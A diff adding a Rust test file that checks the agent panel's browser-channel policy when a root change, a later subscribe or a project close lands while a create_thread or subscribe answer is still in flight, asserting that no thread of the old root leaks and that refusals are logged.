index 0000000..e59ed6e
--- /dev/null
+++ b/crates/agent_ui/src/browser_channel_tests/panel_policy_races.rs
@@ -0,0 +1,425 @@
+// Story 055, task 11.1, fix cycle 1 — the panel policy's answers that arrive after the session
+// changed under them (design.md §B4, §Security "Thread isolation"; R5.5, R7.2, R9.1). Wired
+// INSIDE `src/browser_channel.rs` beside `panel_policy`:
+//
+//     #[cfg(test)]
+//     #[path = "browser_channel_tests/panel_policy_races.rs"]
+//     mod panel_policy_races;
+//
+// A `create_thread` and a `subscribe` to a persisted thread wait on work the session does not
+// hold. These tests hand the session its next message before that work runs (`handle_now`, no
+// `run_until_parked`), so the change lands while the answer is still in flight:
+//   - a `hello` moving the panel to another root: nothing of the old root's thread reaches it
+//     (R5.5), neither a snapshot nor `created`;
+//   - a later `subscribe`: the earlier one is refused, and the refusal is logged (R9.1);
+//   - the project closing: the answer is `project_closed` (R7.2);
+// and the eviction reload's bound holds across the panel's own re-subscribes (design.md §B4
+// Eviction): a spent budget refuses the re-subscribe without loading, so retention and the panel
+// cannot chase each other at the re-subscribe rate.
+
+use std::path::PathBuf;
+use std::sync::Arc;
+use std::time::Duration;
+
+use acp_thread::StubAgentConnection;
+use gpui::{EntityId, TestAppContext, UpdateGlobal as _};
+use serde_json::{Value, json};
+use settings::SettingsStore;
+use workspace::AppState;
+
+use super::test_support::*;
+use super::{ClientMsg, EVICTION_RELOAD_INTERVAL, EVICTION_RELOADS, logged_lines};
+
+fn dev_hello(root: &str) -> Value {
+    json!({
+        "v": 2, "kind": "hello", "id": "h",
+        "client": {
+            "kind": "dev_server", "root": root,
+            "app_url": "http://localhost:5173", "panel_url": "http://localhost:5174"
+        }
+    })
+}
+
+fn panel_hello(root: &str) -> Value {
+    json!({ "v": 2, "kind": "hello", "id": "h", "client": { "kind": "panel", "root": root } })
+}
+
+/// An announced dev server and a panel session for `root`; returns (announce, panel).
+fn connect_panel(root: &str, n: u64, win: &Win, cx: &mut TestAppContext) -> (Probe, Probe) {
+    let announce = open_session(n);
+    announce.handle(dev_hello(root), &win.app_state(), cx);
+    announce.drain(cx);
+    let panel = open_session(n + 1);
+    panel.handle(panel_hello(root), &win.app_state(), cx);
+    panel.drain(cx);
+    (announce, panel)
+}
+
+/// Hands `msg` to the session without running what it spawns, so the next message lands while
+/// this one's answer is still in flight.
+fn handle_now(probe: &Probe, msg: Value, app_state: &Arc<AppState>, cx: &mut TestAppContext) {
+    let msg: ClientMsg = serde_json::from_value(msg).expect("ClientMsg deserializes");
+    cx.update(|cx| super::handle_session_message(&probe.session, msg, app_state.clone(), cx));
+}
+
+fn reply(msgs: &[Value], id: &str) -> Value {
+    msgs.iter()
+        .find(|m| m["id"] == id)
+        .cloned()
+        .unwrap_or_else(|| panic!("no reply to {id}: {msgs:?}"))
+}
+
+fn subscribe(id: &str, thread_id: &str) -> Value {
+    request(
+        "subscribe",
+        id,
+        json!({ "target": { "thread_id": thread_id } }),
+    )
+}
+
+fn created_thread(panel: &Probe, win: &Win, cx: &mut TestAppContext) -> String {
+    panel.handle(
+        request("create_thread", "c", json!({})),
+        &win.app_state(),
+        cx,
+    );
+    let created = reply(&panel.drain(cx), "c");
+    assert_eq!(created["kind"], "created", "{created}");
+    created["thread"]["thread_id"]
+        .as_str()
+        .expect("a thread id")
+        .to_string()
+}
+
+/// A connection whose sessions load again, under the agent id the window's panel keys it by.
+fn loadable_connection() -> StubAgentConnection {
+    StubAgentConnection::new()
+        .with_supports_load_session(true)
+        .with_agent_id("Test".into())
+}
+
+/// A devtools thread of `root` that exists only in the stores (saved with a session, marked) and
+/// is not loaded; its agent is the window's own, so loading it succeeds.
+fn persisted_devtools_thread(win: &Win, root: &str, cx: &mut TestAppContext) -> String {
+    let thread_id = crate::thread_metadata_store::ThreadId::new();
+    let project = win
+        .workspace
+        .read_with(&win.cx, |workspace, _| workspace.project().clone());
+    let active = crate::test_support::active_thread_id(&win.panel, &win.cx);
+    cx.update(|cx| {
+        let store = crate::thread_metadata_store::ThreadMetadataStore::global(cx);
+        let agent_id = store
+            .read(cx)
+            .entry(active)
+            .map(|metadata| metadata.agent_id.clone())
+            .expect("the window's thread has metadata");
+        let metadata = crate::thread_metadata_store::ThreadMetadata {
+            thread_id,
+            session_id: Some(agent_client_protocol::v2::schema::SessionId::new(format!(
+                "persisted-{}",
+                thread_id.to_key_string()
+            ))),
+            agent_id,
+            title: Some("Persisted devtools thread".into()),
+            title_override: None,
+            updated_at: chrono::Utc::now(),
+            created_at: None,
+            interacted_at: None,
+            worktree_paths: project.read(cx).worktree_paths(cx),
+            archived: false,
+            remote_connection: None,
+        };
+        store.update(cx, |store, cx| store.save(metadata, cx));
+    });
+    cx.run_until_parked();
+    cx.update(|cx| {
+        crate::thread_organization::ThreadOrganizationStore::global(cx).update(cx, |store, cx| {
+            store
+                .set_devtools_root(thread_id, PathBuf::from(root), cx)
+                .expect("a saved thread can carry the mark");
+        })
+    });
+    cx.run_until_parked();
+    thread_id.to_key_string()
+}
+
+fn thread_id_of(key: &str, cx: &mut TestAppContext) -> crate::thread_metadata_store::ThreadId {
+    cx.update(|cx| {
+        crate::thread_metadata_store::ThreadMetadataStore::global(cx)
+            .read(cx)
+            .entry_ids()
+            .find(|id| id.to_key_string() == key)
+            .unwrap_or_else(|| panic!("{key} is a known thread"))
+    })
+}
+
+/// Gives a created thread a session, as its first message would, so retention may release it
+/// and it can be loaded again.
+fn promote(key: &str, cx: &mut TestAppContext) {
+    let id = thread_id_of(key, cx);
+    cx.update(|cx| {
+        let store = crate::thread_metadata_store::ThreadMetadataStore::global(cx);
+        let mut metadata = store
+            .read(cx)
+            .entry(id)
+            .cloned()
+            .expect("metadata of a created thread");
+        metadata.session_id = Some(agent_client_protocol::v2::schema::SessionId::new(format!(
+            "session-{key}"
+        )));
+        store.update(cx, |store, cx| store.save(metadata, cx));
+    });
+    cx.run_until_parked();
+}
+
+/// The view the window's panel holds for `thread_id`, if any: active, retained or the draft.
+fn view_of(app: &Win, thread_id: crate::thread_metadata_store::ThreadId) -> Option<EntityId> {
+    app.panel.read_with(&app.cx, |panel, cx| {
+        panel
+            .conversation_view_for(thread_id, cx)
+            .map(|view| view.entity_id())
+    })
+}
+
+fn set_max_idle_retained_threads(count: usize, cx: &mut TestAppContext) {
+    cx.update(|cx| {
+        SettingsStore::update_global(cx, |store, cx| {
+            store
+                .set_user_settings(
+                    &format!(r#"{{ "agent": {{ "max_idle_retained_threads": {count} }} }}"#),
+                    cx,
+                )
+                .expect("valid agent settings");
+        });
+    });
+    cx.run_until_parked();
+}
+
+/// Retention releases every idle retained thread: a cap of 0 runs the panel's cleanup.
+fn evict_idle_threads(cx: &mut TestAppContext) {
+    set_max_idle_retained_threads(5, cx);
+    set_max_idle_retained_threads(0, cx);
+}
+
+fn panel_refusals(kind: &str) -> Vec<String> {
+    logged_lines()
+        .into_iter()
+        .filter(|line| {
+            line.contains("event=panel_refused") && line.contains(&format!("kind={kind} "))
+        })
+        .collect()
+}
+
+#[gpui::test]
+async fn hostile_a_root_change_during_a_subscribe_load_shows_nothing_of_the_old_roots_thread(
+    cx: &mut TestAppContext,
+) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let app = window(&fs, "/p/app", Some(loadable_connection()), cx).await;
+    let _web = window(&fs, "/p/web", None, cx).await;
+    let persisted = persisted_devtools_thread(&app, "/p/app", cx);
+    let (_announce, panel) = connect_panel("/p/app", 1, &app, cx);
+    let app_state = app.app_state();
+
+    handle_now(&panel, subscribe("s", &persisted), &app_state, cx);
+    handle_now(&panel, panel_hello("/p/web"), &app_state, cx);
+    let got = panel.drain(cx);
+
+    let answer = reply(&got, "s");
+    assert_eq!(answer["kind"], "error", "{answer}");
+    assert_eq!(answer["error"], "bad_request", "{answer}");
+    let kinds = kinds(&got);
+    assert!(
+        !kinds
+            .iter()
+            .any(|kind| kind == "snapshot" || kind.starts_with("entry")),
+        "R5.5: no snapshot or entry of /p/app's thread reaches /p/web's panel: {kinds:?}"
+    );
+    assert!(
+        !serde_json::to_string(&got)
+            .expect("json")
+            .contains(&persisted),
+        "R5.5: the old root's thread id never reaches the panel: {got:?}"
+    );
+
+    // Nothing is bound either: a send has no thread to go to.
+    panel.handle(
+        request("send", "m", json!({ "text": "x", "attachments": [] })),
+        &app_state,
+        cx,
+    );
+    assert_eq!(reply(&panel.drain(cx), "m")["error"], "no_thread");
+}
+
+#[gpui::test]
+async fn hostile_a_root_change_during_a_create_never_answers_created_with_the_old_roots_thread(
+    cx: &mut TestAppContext,
+) {
+    init(cx);
+    let fs = shared_fs(cx).await;
+    let app = window(&fs, "/p/app", Some(StubAgentConnection::new()), cx).await;
+    let _web = window(&fs, "/p/web", None, cx).await;
+    let (_announce, panel) = connect_panel("/p/app", 1, &app, cx);
+    let app_state = app.app_state();
+    let refused = panel_refusals("create_thread").len();
+
+    handle_now(
+        &panel,
+        request("create_thread", "c", json!({})),
+        &app_state,
+        cx,
+    );
+    handle_now(&panel, panel_hello("/p/web"), &app_state, cx);
+    let got = panel.drain(cx);
+
+    let answer = reply(&got, "c");
+    assert_eq!(answer["kind"], "error", "R5.5: not created: {answer}");
+    assert_eq!(answer["error"], "bad_request", "{answer}");
+    assert!(
+        !got.iter()
+            .any(|msg| msg["kind"] == "created" || msg.get("thread").is_some()),
+        "R5.5: no thread of /p/app reaches /p/web's panel: {got:?}"
+    );
+    let lines = panel_refusals("create_thread");
+    assert_eq!(lines.len(), refused + 1, "R9.1: the refusal is logged");
+    assert!(lines[refused].contains("root=/p/app"), "{}", lines[refused]);
+}
